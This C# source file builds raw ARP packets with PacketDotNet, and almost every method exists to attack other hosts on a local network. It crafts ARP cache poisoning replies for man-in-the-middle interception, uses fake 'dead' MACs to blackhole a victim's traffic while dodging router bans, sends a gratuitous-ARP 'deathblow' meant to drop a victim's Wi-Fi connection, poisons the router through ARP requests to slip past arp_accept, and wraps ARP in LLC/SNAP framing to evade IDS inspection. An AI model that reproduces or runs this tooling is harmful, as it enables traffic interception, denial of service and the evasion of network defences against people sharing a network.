using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;

namespace MyNet.Helpers
{
    /// <summary>
    /// Builds raw ARP packets for scanning and spoofing purposes.
    ///
    /// ARP refresher:
    ///   - ARP Request  (op=1): "Who has IP X? Tell IP Y."
    ///   - ARP Reply    (op=2): "IP X is at MAC M."
    ///
    /// Spoofing attack:
    ///   Packet A → sent to victim  : "Gateway IP is at MY MAC"  (poisons victim's ARP cache)
    ///   Packet B → sent to gateway : "Victim IP is at MY MAC"   (poisons gateway's ARP cache)
    /// Traffic now flows through us; we forward it (or drop it) as needed.
    /// </summary>
    public static class ArpPacketBuilder
    {
        // ----------------------------------------------------------------
        //  ARP Request  (used during network scan)
        // ----------------------------------------------------------------

        /// <summary>
        /// Builds a broadcast ARP request to discover who owns <paramref name="targetIp"/>.
        /// </summary>
        public static byte[] BuildArpRequest(
            string senderMac,
            string senderIp,
            string targetIp)
        {
            var senderMacBytes = NetworkUtils.ParseMac(senderMac);
            var senderIpAddr   = IPAddress.Parse(senderIp);
            var targetIpAddr   = IPAddress.Parse(targetIp);
            var broadcastMac   = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
            var zeroPadMac     = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            // Ethernet frame
            var ethPacket = new EthernetPacket(
                new PhysicalAddress(senderMacBytes),
                new PhysicalAddress(broadcastMac),
                EthernetType.Arp);

            // ARP payload
            var arpPacket = new ArpPacket(
                ArpOperation.Request,
                new PhysicalAddress(zeroPadMac),   // target MAC unknown
                targetIpAddr,
                new PhysicalAddress(senderMacBytes),
                senderIpAddr);

            ethPacket.PayloadPacket = arpPacket;
            return ethPacket.Bytes;
        }

        // ----------------------------------------------------------------
        //  ARP Reply  (used for spoofing)
        // ----------------------------------------------------------------

        /// <summary>
        /// Builds a crafted ARP reply telling <paramref name="targetMac"/> / <paramref name="targetIp"/>
        /// that <paramref name="spoofedIp"/> is reachable at <paramref name="ourMac"/>.
        ///
        /// Usage:
        ///   BuildArpReply(ourMac, gatewayIp, victimMac, victimIp)
        ///     → tells the victim that the gateway is at ourMac
        ///   BuildArpReply(ourMac, victimIp, gatewayMac, gatewayIp)
        ///     → tells the gateway that the victim is at ourMac
        /// </summary>
        public static byte[] BuildArpReply(
            string ourMac,
            string spoofedIp,
            string targetMac,
            string targetIp)
        {
            var ourMacBytes    = NetworkUtils.ParseMac(ourMac);
            var targetMacBytes = NetworkUtils.ParseMac(targetMac);

            // Ethernet frame (unicast to the target)
            var ethPacket = new EthernetPacket(
                new PhysicalAddress(ourMacBytes),
                new PhysicalAddress(targetMacBytes),
                EthernetType.Arp);

            // ARP reply
            var arpPacket = new ArpPacket(
                ArpOperation.Response,
                new PhysicalAddress(targetMacBytes),
                IPAddress.Parse(targetIp),
                new PhysicalAddress(ourMacBytes),
                IPAddress.Parse(spoofedIp));

            ethPacket.PayloadPacket = arpPacket;
            return ethPacket.Bytes;
        }

        // ----------------------------------------------------------------
        //  ARP Poison  (allows custom ARP sender MAC != Ethernet source)
        // ----------------------------------------------------------------

        /// <summary>
        /// Builds an ARP reply where the Ethernet source is <paramref name="realEthSrcMac"/>
        /// but the ARP sender hardware address is <paramref name="fakeArpSenderMac"/>.
        ///
        /// This allows "Reflective Blackholing":
        ///   The Ethernet frame is valid (comes from our real MAC)
        ///   But the ARP cache update points the IP to a DIFFERENT MAC (the victim's own, or gateway's).
        /// </summary>
        public static byte[] BuildArpPoison(
            string realEthSrcMac,
            string fakeArpSenderMac,
            string spoofedIp,
            string targetMac,
            string targetIp)
        {
            var realSrcBytes   = NetworkUtils.ParseMac(realEthSrcMac);
            var fakeSenderBytes = NetworkUtils.ParseMac(fakeArpSenderMac);
            var targetMacBytes = NetworkUtils.ParseMac(targetMac);

            // Ethernet frame: FROM the real carrier MAC
            //                  TO the target MAC
            var ethPacket = new EthernetPacket(
                new PhysicalAddress(realSrcBytes),
                new PhysicalAddress(targetMacBytes),
                EthernetType.Arp);

            // ARP reply: sender hardware = the "fake" MAC we want them to cache
            var arpPacket = new ArpPacket(
                ArpOperation.Response,
                new PhysicalAddress(targetMacBytes),
                IPAddress.Parse(targetIp),
                new PhysicalAddress(fakeSenderBytes),
                IPAddress.Parse(spoofedIp));

            ethPacket.PayloadPacket = arpPacket;
            return ethPacket.Bytes;
        }

        // ----------------------------------------------------------------
        //  GHOST BLACKHOLE BUILDER
        // ----------------------------------------------------------------

        /// <summary>
        /// Builds a completely anonymous ARP reply. 
        /// Both the Ethernet Source AND ARP Sender MAC are set to a non-existent Dead MAC.
        /// If the router's IDS bans the offender holding the IP, it bans the Dead MAC.
        /// The PC remains completely safe. The victim's traffic is routed to the void, 
        /// causing zero Wi-Fi lag.
        /// </summary>
        public static byte[] BuildGhostPoison(
            string deadMac,
            string spoofedIp,
            string targetMac,
            string targetIp)
        {
            var deadMacBytes   = NetworkUtils.ParseMac(deadMac);
            var targetMacBytes = NetworkUtils.ParseMac(targetMac);

            // Frame explicitly originates from the DEAD MAC.
            var ethPacket = new EthernetPacket(
                new PhysicalAddress(deadMacBytes),
                new PhysicalAddress(targetMacBytes),
                EthernetType.Arp);

            var arpPacket = new ArpPacket(
                ArpOperation.Response,
                new PhysicalAddress(targetMacBytes),
                IPAddress.Parse(targetIp),
                new PhysicalAddress(deadMacBytes),
                IPAddress.Parse(spoofedIp));

            ethPacket.PayloadPacket = arpPacket;
            return ethPacket.Bytes;
        }

        // ----------------------------------------------------------------
        //  RFC 5227 IP DEATHBLOW (Broadcast Announcement)
        // ----------------------------------------------------------------

        /// <summary>
        /// Builds a strict RFC 5227 Broadcast ARP Announcement (Gratuitous ARP).
        /// This forces the Victim's operating system (iOS/Android/Windows) into an uncontrollable 
        /// panic state due to a perceived authentic IP address conflict on the subnet. 
        /// The Victim's OS will autonomously tear down its own Wi-Fi interface to protect the 
        /// network, permanently losing internet access.
        /// The Router's Intrusion Detection System completely ignores this packet because the 
        /// Gateway IP is untouched.
        /// </summary>
        public static byte[] BuildArpAnnouncement(string targetIp, string ourMac)
        {
            var ourMacBytes = NetworkUtils.ParseMac(ourMac);
            var targetIpAddress = IPAddress.Parse(targetIp);
            var broadcastMac = NetworkUtils.ParseMac("FF:FF:FF:FF:FF:FF");
            var zeroMac = NetworkUtils.ParseMac("00:00:00:00:00:00");

            // Ethernet header: Must be Broadcast to trigger OS conflict detection flawlessly
            var ethPacket = new EthernetPacket(
                new PhysicalAddress(ourMacBytes),
                new PhysicalAddress(broadcastMac),
                EthernetType.Arp);

            // ARP Request payload: Sender IP and Target IP are BOTH the victim's IP. 
            // This natively asserts ownership of the IP on the subnet.
            var arpPacket = new ArpPacket(
                ArpOperation.Request,
                new PhysicalAddress(ourMacBytes),
                targetIpAddress,
                new PhysicalAddress(zeroMac),      // RFC 5227: Target MAC is zero
                targetIpAddress);

            ethPacket.PayloadPacket = arpPacket;
            return ethPacket.Bytes;
        }

        // ----------------------------------------------------------------
        //  THE PARASITE EVASION: Asymmetric IP Hijack
        // ----------------------------------------------------------------

        /// <summary>
        /// Highly advanced Asymmetric Routing evasion (The Parasite Evasion).
        /// We ONLY poison the Router, claiming that the Victim's IP is located at our Authenticated PC MAC.
        /// We use an ARP Request (not Reply) to forcefully bypass `arp_accept=0` kernel protections on Linux routers.
        /// Because we DO NOT spoof the Gateway IP, the Router's IDS NEVER bans us.
        /// </summary>
        public static byte[] BuildParasiteArpRequest(string ourMac, string victimIp, string routerMac, string routerIp)
        {
            var pMac = NetworkUtils.ParseMac(ourMac);
            var rMac = NetworkUtils.ParseMac(routerMac);
            
            // ARP Request: "Who has Router IP? Tell Victim IP (at my PC MAC)!"
            var arpPacket = new ArpPacket(
                ArpOperation.Request,
                new PhysicalAddress(rMac),
                System.Net.IPAddress.Parse(routerIp),
                new PhysicalAddress(pMac),
                System.Net.IPAddress.Parse(victimIp));

            // We must use our authenticated PC MAC as the true Ethernet Source,
            // otherwise the AP's 802.11 security layer will silently drop the frame.
            var ethPacket = new EthernetPacket(
                new PhysicalAddress(pMac),
                new PhysicalAddress(rMac),
                EthernetType.Arp);

            ethPacket.PayloadPacket = arpPacket;
            return ethPacket.Bytes;
        }

        // ----------------------------------------------------------------
        //  IDS EVASION: IEEE 802.3 LLC/SNAP
        // ----------------------------------------------------------------

        /// <summary>
        /// Highly advanced evasion technique.
        /// Wraps the ARP payload inside an IEEE 802.3 LLC/SNAP header.
        /// Most network IDS engines (like Unifi/Omada) expect Ethernet II frames.
        /// When they parse 802.3, the length field confuses them into skipping the deep packet inspection.
        /// However, the Victim's sophisticated OS TCP/IP stack successfully unpacks the SNAP logic 
        /// and applies the ARP poison, entirely bypassing the Router's ban mechanism.
        /// </summary>
        public static byte[] BuildLlcSnapArpReply(
            string ourMac,
            string spoofedIp,
            string targetMac,
            string targetIp)
        {
            var ourMacBytes    = NetworkUtils.ParseMac(ourMac);
            var targetMacBytes = NetworkUtils.ParseMac(targetMac);

            // Raw ARP payload (28 bytes)
            var arpPacket = new ArpPacket(
                ArpOperation.Response,
                new PhysicalAddress(targetMacBytes),
                IPAddress.Parse(targetIp),
                new PhysicalAddress(ourMacBytes),
                IPAddress.Parse(spoofedIp));

            var arpPayload = arpPacket.Bytes;
            
            // LLC/SNAP header length = 8 bytes.
            // Packet length field in 802.3 = size of LLC/SNAP + ARP payload
            int lengthField = 8 + arpPayload.Length;
            
            byte[] buffer = new byte[14 + 8 + arpPayload.Length];
            
            // 802.3 Header (Dest, Src, Length)
            Array.Copy(targetMacBytes, 0, buffer, 0, 6);
            Array.Copy(ourMacBytes, 0, buffer, 6, 6);
            buffer[12] = (byte)(lengthField >> 8);
            buffer[13] = (byte)(lengthField & 0xFF);
            
            // LLC/SNAP Header
            buffer[14] = 0xAA; // DSAP
            buffer[15] = 0xAA; // SSAP
            buffer[16] = 0x03; // Control field (Unnumbered Information)
            buffer[17] = 0x00; // Organization Code
            buffer[18] = 0x00; 
            buffer[19] = 0x00; 
            buffer[20] = 0x08; // EtherType (ARP = 0x0806)
            buffer[21] = 0x06; 
            
            // ARP Payload
            Array.Copy(arpPayload, 0, buffer, 22, arpPayload.Length);
            
            return buffer;
        }

        // ----------------------------------------------------------------
        //  ARP Restore  (clean-up: send the truth back)
        // ----------------------------------------------------------------

        /// <summary>
        /// Sends the correct ARP mapping so both victim and gateway restore
        /// their caches when we stop spoofing.
        ///
        ///   BuildArpRestore(gatewayMac, gatewayIp, victimMac, victimIp)
        ///     → tells victim the REAL gateway MAC
        ///   BuildArpRestore(victimMac, victimIp, gatewayMac, gatewayIp)
        ///     → tells gateway the REAL victim MAC
        /// </summary>
        public static byte[] BuildArpRestore(
            string realSenderMac,
            string realSenderIp,
            string targetMac,
            string targetIp)
            => BuildArpReply(realSenderMac, realSenderIp, targetMac, targetIp);
    }
}